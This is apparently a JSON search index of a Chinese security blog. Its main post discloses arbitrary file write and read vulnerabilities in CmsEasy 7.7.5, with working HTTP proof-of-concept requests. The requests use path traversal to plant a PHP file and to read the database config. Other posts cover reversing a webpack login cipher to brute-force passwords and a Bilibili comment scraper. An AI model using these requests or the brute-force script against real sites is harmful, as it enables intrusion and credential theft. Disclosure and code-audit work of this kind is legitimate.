{"pages":[{"title":"关于我","text":"KeepOnFigthing --> jdr 2020年6月29日开始学习web安全。 2021年大学毕业。 至今仍是菜狗+单身狗。 喜欢打网球，白嫖资源。 现就职于一家安全公司，是一名安全服务工程师。 目前在学习代码审计，app安全，以及内网渗透。 B站: https://space.bilibili.com/486838364EDUSRC：https://src.sjtu.edu.cn/profile/8186/ 安全团队公众号","link":"/about/index.html"}],"posts":[{"title":"CmsEasy_7.7.5_20211012存在任意文件写入和任意文件读取漏洞","text":"CmsEasy_7.7.5_20211012存在任意文件写入漏洞和任意文件读取漏洞 一、厂商官网cmseasy 二、安装包下载https://www.cmseasy.cn/download/ https://ftp.cmseasy.cn/CmsEasy7.x/CmsEasy_7.7.5_UTF-8_20211012.zip 2.1 任意文件写入漏洞getshell后台漏洞，需登录。 2.2.1 任意文件写入漏洞poc12345678910POST /index.php?case=template&amp;act=save&amp;admin_dir=admin&amp;site=default HTTP/1.1Host: 192.168.31.96Content-Length: 57X-Requested-With: XMLHttpRequestUser-Agent: Mozilla/5.0Content-Type: application/x-www-form-urlencoded;Cookie: login_username=admin; login_password=357fce333f91905f3e7342d10e5a5ce4;Connection: closesid=#data_d_.._d_.._d_.._d_1.php&amp;slen=693&amp;scontent=&lt;?php phpinfo();?&gt; .._d_ 代表 ../，此处用来路径穿越发送漏洞利用的poc数据包，响应内容是ok时，代表网站根目录下被写入了1.php文件。 访问http://192.168.31.96/1.php (或者是http://localhost/1.php)，此时发现phpinfo被成功执行。 2.2.2 任意文件写入漏洞代码分析出现此漏洞的文件是lib/admin/template_admin.php post方法传入sid=#data_d_.._d_.._d_.._d_1.php，经过一轮的正则替换，最后tpl=data/../../../1.php post方法传入scontent=&lt;?php phpinfo();?&gt;，先通过编码实例化，再通过正则替换将单引号转义，此时content=&lt;?php phpinfo();?&gt;，这里的正则处理是对XSS漏洞的处理，对写入的php代码不生效。 当site=default时，代码执行到最外层else处（第2789行），此过程中，content值不变，通过file_put_contents造成了任意文件写入漏洞。 2.2 任意文件读取漏洞后台漏洞，需登录。 2.2.1 任意文件读取漏洞poc12345678910POST /index.php?case=template&amp;act=fetch&amp;admin_dir=admin&amp;site=default HTTP/1.1Host: 192.168.31.96X-Requested-With: XMLHttpRequestUser-Agent: Mozilla/5.0Content-Type: application/x-www-form-urlencoded;Cookie: login_username=admin; login_password=357fce333f91905f3e7342d10e5a5ce4; Connection: closeContent-Length: 32id=#data_d_.._d_.._d_.._d_config_d_config_database.php .._d_ 代表 ../，此处用来路径穿越 发送漏洞利用的poc数据包响应内容是cmseasy网站配置文件config/config_database.php的文件内容信息。该响应信息中包含了数据库连接地址账号以及密码。 2.2.2 任意文件读取漏洞代码分析出现此漏洞的文件是lib/admin/template_admin.php post方法传入id=#data_d_.._d_.._d_.._d_config_d_config_database.php 通过一系列的正则替换tpl=data/../../../config/config_database.php 最后通过第2757行的file_get_contents函数读取到了配置文件信息。","link":"/2021/10/14/CmsEasy_7.7.5_20211012%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E5%92%8C%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"title":"实战webpack_js算法逆向分析","text":"遇到一个网站，使用了webpack 输入账号密码后，发现密码被加密了。 此时尝试定位该加密算法，并正向爆破。 当前登录的请求接口是/prod-api/auth/login 此时全局搜索该接口 成功找到该接口文件 打开该js文件，通过分析js函数，可知2727行的r函数作用是登录请求，2719行的o函数作用是加密。 此时设置断点，观察数值变化 r函数中的t是用户名admin，e是明文密码123456。 此时下一步 密码e通过2728行的函数调用，传递到了加密函数o。 加密函数o中，t是明文密码，e是密钥，密钥是2021123456789012 加密后123456的密文是wzGWkli7/KSZszgljZhEng== 通过分析发现，此处的加解密算法的对象名是a,通过调用对象a下的属性，实现的加密。 将这段加密的函数，复制到我们的js文件中 此时尝试去找到a在哪声明的。 通过分析，发现a在2717行被声明 并且对象a的值，是由s调用了n中的3452模块。 此时我们要找到n，看n是在哪出现的，我们并把它给拿出来。 因此设置断点直接跟过去。 此时找到了n的声明。 我们将这段声明n函数的代码复制到js文件中，即把分发器复制到js代码中。 并在外部声明一个用于接收分发器值的变量 通过定位追踪 我们将o值，赋值给用户接收分发器函数返回值的变量。 即在分发器代码的末尾处进行赋值。 此时分发器确定了，这个时候要找分发器调用了哪些webpack的模块。 通过前面的分析可知，分发器调用的第一个webpack的模块是3452。 此时全局搜索3452是在哪个js文件下。 此时找到了3452模块，而3452模块又调用了大量的其他模块，因此我们要一一定位。 通过分析后发现，所有的模块和3452模块都是处于同一个js文件中的。 此时创建一个modules.js文件，用于管理这些模块。将该存放模块的js代码，全部复制粘贴到本地的modules.js文件中。 并设置全局变量进行调用即var window = global; 并在encrypt.js文件中导入该模块js文件。 并调用加密函数，查看加密结果。 执行代码后，报错，提示n未被定义。 报错的原因是因为，此时分发器的模块调用的结果，并未赋值给n，而是我最开始设置的变量flag，此flag接收了分发器的返回结果。因此我们要把n改成flag。 修改后，再次运行 123456在本地加密的结果和在前端加密的结果值是一样的。 此时尝试重复并多次加密明文。 使用nodejs，按行读写passwords.txt 并将密码的密文并输出到encrypt_passwors.txt中。 1234567891011121314151617const readline = require('readline');const fs = require('fs');( () =&gt; { let fRead = fs.createReadStream(&quot;passwords.txt&quot;); let objReadLine = readline.createInterface({ input: fRead }); objReadLine.on('line', function (line) { console.log(encrypt(line)); fs.writeFile('./encrypt_passwors.txt', encrypt(line)+'\\n', { 'flag': 'a' }, function(err) { if (err) { throw err; } }); });})(); 尝试去解密aes的加密密文，找了半天也没找到调用了哪些webpack的模块，因此解密失败了，太fw了。","link":"/2021/10/15/%E5%AE%9E%E6%88%98webpack-js%E7%AE%97%E6%B3%95%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/"},{"title":"python3 根据视频BV号爬B站视频的评论消息和UP主的个人信息","text":"python3 根据视频BV号爬B站视频的评论消息和UP主的个人信息 代码如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293import reimport jsonimport requestsimport time, datetimeimport prettytablefrom textwrap import filldef Input_BV(bv_id): target_url_1 = &quot;https://www.bilibili.com/video/&quot;+str(bv_id) headers = { 'Cookie': '1', #cookie可以随意设置 'User-Agent': 'Mozilla/5.0' } resp_1 = requests.get(url = target_url_1 ) jsons = json.loads(re.search(r&quot;window\\.__INITIAL_STATE__=(.*?);&quot;, resp_1.text).group(1)) #获取对应视频BV号的UP主的信息，即获取mid mid = jsons['upData']['mid'] get_up_info(mid) #获取对应视频BV号下的评论，此时aid=oid oid = jsons['aid'] get_BV_comment(oid) #获取对应视频BV号的UP主信息def get_up_info(mid): url = &quot;https://api.bilibili.com/x/web-interface/card?article=true&amp;mid=&quot; + str(mid) headers = { 'Cookie': '1', #cookie可以随意设置 'User-Agent': 'Mozilla/5.0' } resp = requests.get(url, headers=headers) jsons = json.loads(resp.text) #up的名字 up_name = jsons['data']['card']['name'] #up的性别 up_sex = jsons['data']['card']['sex'] #up的粉丝数 up_fans = jsons['data']['card']['fans'] #up的关注数 up_attention = jsons['data']['card']['attention'] #up的个性签名 up_sign = jsons['data']['card']['sign'] #up的投稿数量 up_archive_count = jsons['data']['archive_count'] #up的获赞数量 up_like_num = jsons['data']['like_num'] #使用prettytable美化数据输出 table = prettytable.PrettyTable() #设置表头 table.field_names = ['up的姓名','up的性别','up的粉丝数','up的关注数','up的投稿数','up的获赞数','up的个性签名'] table.align['up的个性签名']='l' #个性签名左对齐 #将数据加入到表格 table.add_row([up_name,up_sex,str(up_fans),str(up_attention),str(up_archive_count),str(up_like_num),fill(up_sign,width=50)]) print(table) #获取对应视频BV号下的评论def get_BV_comment(oid): url = &quot;https://api.bilibili.com/x/v2/reply/main?callback=&amp;jsonp=jsonp&amp;next=0&amp;type=1&amp;mode=3&amp;plat=1&amp;oid=&quot; + str(oid) headers = { 'Cookie': '1', #cookie可以随意设置 'User-Agent': 'Mozilla/5.0' } resp = requests.get(url, headers=headers) jsons = json.loads(resp.text) table = prettytable.PrettyTable() # 定义表头 table.field_names = ['姓名','评论','评论时间'] table.align['姓名']='l' #左对齐 table.align['评论']='l' #左对齐 for i in jsons['data']['replies']: #获取评论人的姓名 name = i['member']['uname'] #获取评论人的评论内容 comment = i['content']['message'] #获取评论时间 time = i['ctime'] # 增加一行数据，列表里的元素按照顺序对应表头 table.add_row([fill(name,width=50),fill(comment,width=50),to_time(time)]) print(table) #将ctime时间戳转换成时间格式def to_time(time_stamp): timeArray = datetime.datetime.fromtimestamp(time_stamp) otherStyleTime = timeArray.strftime(&quot;%Y--%m--%d %H:%M:%S&quot;) return otherStyleTimeif __name__==&quot;__main__&quot;: BV_ID = input(&quot;请输入视频BV号：&quot;) Input_BV(BV_ID); 此处的评论没有爬完，只爬了最先盖楼的那个人。","link":"/2021/10/24/python3-%E6%A0%B9%E6%8D%AE%E8%A7%86%E9%A2%91BV%E5%8F%B7%E7%88%ACB%E7%AB%99%E8%A7%86%E9%A2%91%E7%9A%84%E8%AF%84%E8%AE%BA%E6%B6%88%E6%81%AF%E5%92%8CUP%E4%B8%BB%E7%9A%84%E4%B8%AA%E4%BA%BA%E4%BF%A1%E6%81%AF/"}],"tags":[{"name":"php代码审计","slug":"php代码审计","link":"/tags/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"name":"Javascript","slug":"Javascript","link":"/tags/Javascript/"},{"name":"爬虫,B站","slug":"爬虫-B站","link":"/tags/%E7%88%AC%E8%99%AB-B%E7%AB%99/"}],"categories":[{"name":"0day挖掘","slug":"0day挖掘","link":"/categories/0day%E6%8C%96%E6%8E%98/"},{"name":"webpack算法逆向","slug":"webpack算法逆向","link":"/categories/webpack%E7%AE%97%E6%B3%95%E9%80%86%E5%90%91/"},{"name":"python3","slug":"python3","link":"/categories/python3/"}]}